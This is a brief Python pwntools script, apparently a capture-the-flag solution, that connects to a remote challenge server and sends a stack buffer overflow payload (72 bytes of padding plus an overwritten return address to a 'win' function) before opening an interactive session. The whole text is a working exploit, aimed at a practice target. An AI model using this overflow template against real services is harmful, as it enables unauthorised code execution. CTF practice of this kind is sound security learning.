from pwn import *
import sys
import struct
import os

context.arch = 'amd64'

host = "shell.actf.co"
port = 21830
conn = remote(host, port)

win = 0x401196

payload = b"A" * 72
payload += struct.pack("L", win)
conn.sendline(payload)
conn.interactive()
